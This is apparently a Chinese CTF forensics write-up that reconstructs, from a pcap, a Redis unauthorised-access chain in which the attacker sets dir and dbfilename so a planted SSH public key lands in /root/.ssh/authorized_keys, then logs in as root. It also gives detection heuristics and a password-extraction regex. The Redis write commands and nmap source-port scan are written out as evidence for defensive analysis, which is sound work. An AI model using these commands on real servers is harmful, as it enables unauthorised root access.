# case10：Redis 写 SSH 公钥提权链（2021.pcapng）

**类型**：Redis 未授权利用链还原（写 SSH 公钥 → root 免密登录）
**样本**：2021.pcapng（252942 包 / 55MB）
**工具化**：`ctfsweep/core/session.py` 新增"Redis 利用特征检测"

---

## 拓扑

| 角色 | IP | 系统 |
|------|-----|------|
| 攻击机 | `192.168.100.88` | Kali（OpenSSH 8.3p1 Debian） |
| 受害者 | `192.168.100.154` | Linux（OpenSSH 6.6.1 / Redis 6379 / 80 / 443） |

## 完整攻击链（按时间序）

```
① 全端口扫描（固定源端口 49726 痕迹——.88:49726 → .154:任意端口，1.5 万+ 流）
   识别点：单个源端口对多个目的端口大量 SYN = 扫描器（nmap -g 49726）

② Redis 探测与认证
   info                     → -NOAUTH Authentication required（需认证）
   AUTH 11aacc              → +OK ★ 密码 11aacc（弱口令）
   COMMAND / ping / get test → 枚举环境

③ Redis 写文件提权（经典手法，RESP 协议可见）
   config set dir /root/.ssh          ← 目标目录指向 SSH 目录
   config set dbfilename authorized_keys ← 文件名改为 authorized_keys
   set test "<换行的 ssh-rsa 公钥>"     ← 公钥作为"数据"写入
   save                               ← 落盘

④ SSH root 登录（用注入的公钥）
   .88:60934 → .154:22（OpenSSH 握手：curve25519-sha256 密钥交换）
   83 包对 50 包的完整会话 = 登录成功并在使用

（同抓包还有：.41 主机大量正常上网流量——图片/视频站点，属背景噪声）
```

## 关键提取物

| 项 | 值 |
|----|-----|
| Redis AUTH 密码 | **11aacc** |
| 写入路径 | `/root/.ssh/authorized_keys` |
| 注入的 SSH 公钥 | `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx…= root@kali`（注释 root@kali） |
| 攻击机 SSH 客户端 | OpenSSH_8.3p1 Debian（Kali 默认） |
| 受害者 SSH 服务 | OpenSSH_6.6.1 |

## 分析要点（RESP 协议速读）

Redis 客户端命令是 RESP 数组格式，肉眼可读：
```
*2\r\n$4\r\nAUTH\r\n$6\r\n11aacc\r\n
└ 数组2元素  └长4:"AUTH" └长6:"11aacc"
```
- `$4\r\nAUTH\r\n$6\r\n11aacc` = AUTH 11aacc
- `$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$10\r\n/root/.ssh` = config set dir /root/.ssh
- 提取密码用 RESP 严格模式：`AUTH\r\n\$\d+\r\n([^\r\n]{1,64})\r\n`；
  宽松模式会把 `-NOAUTH Authentication required` 里的单词误抓为密码

### 判别陷阱

1. **双向流要分开判**：`.154:6379→.88`（服务端方向）的 COMMAND 输出里也含
   "config"（命令名列表）但**没有** `/root/.ssh`——检测必须逐方向检查，
   否则"攻击内容在客户端方向"会被服务端方向的先出现所遮蔽。
2. **固定源端口扫描**：49726 出现在 1.5 万条流里——不是服务端口，是 **nmap `-g`**。
   同理 attack.pcapng 的 60099（case08）。这个特征两案通用。
3. **"set test -a xxx"变体**：部分利用脚本把密码拼在 SET 参数里
   （`set test -a 11aacc <key>`），公钥素材可能出现在与 config 不同的 TCP 流中
   ——公钥提取要独立扫所有 6379 流，别只查 config 那条。

## 工具化沉淀（已实现）

`session.py` 新增 Redis 利用检测（0.95 分）：
```
[⚠️ Redis利用] 流中发现 SSH 公钥（写 authorized_keys 素材）×2
[⚠️ Redis利用] 192.168.100.88:54624 → 192.168.100.154:6379
    Redis 写文件提权链（写 SSH 公钥 → authorized_keys，可 root 免密登录）；AUTH 密码=11aacc
```

## 同类变体判断指引

- Redis 窗口出现 `config set dir` + `dbfilename` = 写文件利用（提权/GetShell 前置）
- 写文件三方向：SSH 公钥（/root/.ssh/authorized_keys）/ 计划任务（/var/spool/cron/root）/
  网站目录（webshell）——本类题多问"写入了什么文件/内容"
- 后续验证：抓包中紧随其后的 SSH 长会话 = 利用成功
- 无认证直接 `set/slaveof` 的变体（主从复制 RCE）同理可套本检测思路
